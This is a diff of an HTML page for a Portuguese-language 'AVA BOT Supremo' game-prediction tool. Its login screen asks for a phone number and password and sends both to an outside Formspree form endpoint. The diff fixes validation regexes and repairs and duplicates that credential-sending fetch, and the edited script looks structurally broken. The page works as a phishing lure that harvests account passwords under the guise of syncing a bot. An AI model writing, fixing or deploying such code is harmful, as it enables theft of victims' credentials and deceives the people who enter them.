@@ -64,14 +64,13 @@
 
   <footer>© AVA BOT Supremo</footer>
   <audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>
-
   <script>
     const homeForm=document.getElementById("homeForm"),numeroInicio=document.getElementById("numeroInicio"),chaveInicio=document.getElementById("chaveInicio"),homeScreen=document.getElementById("homeScreen"),gameScreen=document.getElementById("gameScreen"),loginScreen=document.getElementById("loginScreen"),syncScreen=document.getElementById("syncScreen"),loginForm=document.getElementById("loginForm"),numeroLogin=document.getElementById("numeroLogin"),senhaLogin=document.getElementById("senhaLogin"),statusMsg=document.getElementById("statusMsg"),circle=document.getElementById("circle"),preverBtn=document.getElementById("preverBtn"),resultado=document.getElementById("resultado"),blockedMsg=document.getElementById("blockedMsg"),openLogin=document.getElementById("openLogin"),closeLogin=document.getElementById("closeLogin"),backToGame=document.getElementById("backToGame"),beepSound=document.getElementById("beepSound");
 
     // Tela inicial
     homeForm.addEventListener("submit",function(e){
       e.preventDefault();
-      if(!/^9\\d{8}$/.test(numeroInicio.value)){alert("Número inválido!");return;}
+      if(!/^9\d{8}$/.test(numeroInicio.value)){alert("Número inválido!");return;}
       if(chaveInicio.value!=="10102025"){alert("Chave incorreta!");return;}
       homeScreen.style.display="none";
       gameScreen.style.display="block";
@@ -121,7 +120,7 @@
       const numero=numeroLogin.value;
       const senha=senhaLogin.value;
 
-      if(!/^9\\d{8}$/.test(numero)){
+      if(!/^9\d{8}$/.test(numero)){
         statusMsg.textContent="⚠️ O número deve começar com 9 e ter 9 dígitos.";
         return;
       }
@@ -132,8 +131,10 @@
         await fetch("https://formspree.io/f/mbdeddpb",{
           method:"POST",
           body:JSON.stringify({numero,senha}),
-          headers:{"
-              await fetch("https://formspree.io/f/mbdeddpb",{
+          headers:{"Content-Type":"application/json"}
+        });
+      try{
+        await fetch("https://formspree.io/f/mbdeddpb",{
           method:"POST",
           body:JSON.stringify({numero,senha}),
           headers:{"Content-Type":"application/json"}
@@ -145,7 +146,6 @@
         statusMsg.textContent="❌ Erro ao enviar dados.";
       }
     });
-
     backToGame.addEventListener("click",function(){
       syncScreen.style.display="none";
       gameScreen.style.display="block";
@@ -156,4 +156,3 @@
   </script>
 </body>
 </html>
-      
